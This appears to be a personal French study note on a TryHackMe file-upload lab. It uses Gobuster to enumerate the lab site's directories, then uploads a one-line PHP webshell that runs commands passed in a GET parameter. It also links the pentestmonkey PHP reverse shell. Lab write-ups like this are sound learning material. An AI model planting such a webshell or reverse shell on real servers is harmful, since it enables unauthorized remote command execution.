
# Gobuster

## Utilisation sur THM

**Gobuster** est un outil utilisé principalement pour effectuer des attaques de **dictionnaire** sur des serveurs web. Il sert à **découvrir des répertoires, des fichiers, ou des sous-domaines** cachés sur un site web. Gobuster fonctionne en envoyant des requêtes HTTP avec des chemins (URLs) issus d'un fichier de dictionnaire, afin de déterminer s'il existe des ressources accessibles mais non visibles immédiatement.

### Exemple d'utilisation:

Mise en contexte du challenge:

- un site web fournit par THM
- utilisation de gobuster pour effectuer un scan
- le but: upload des fichier (en php) afin qu'ils soient interpréter par le serveur et permettre un RCE

Le site:

![[Pasted image 20250312110409.png]]

Lancement d'un scan Gobuster:


```
gobuster dir -u http://shell.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Cette commande va permettre d'énumérer des répertoires précis d'un site web à l'aide d'une liste.

![[../../images/Challenge gobuster 1.png]]

Ce qui va être utile ici est /ressources

Avant de voir ce chemin, il faut tenter d'upload un fichier:

![[../../images/Challenge gobuster 3.png]]

Upload d'un webshell, contenu:

```
<?php       
echo system($_GET["cmd"]);   
?>
```

Permet d'exécuter les commandes par GET:

Il est également possible d'utiliser un reverse shell:

J'ai utilisé celui de pentestMonkey:

https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

Le principe est le même, il faut upload son script sur le serveur et l'exécuter. 

![[../../images/Challenge gobuster 3.png]]


![[../../images/Challenge gobuster 4.png]]

![[../../images/Challenge gobuster 5.png]]
On trouve le flag comme indiqué dans /var/www/

![[../../images/Challenge gobuster 2.png]]
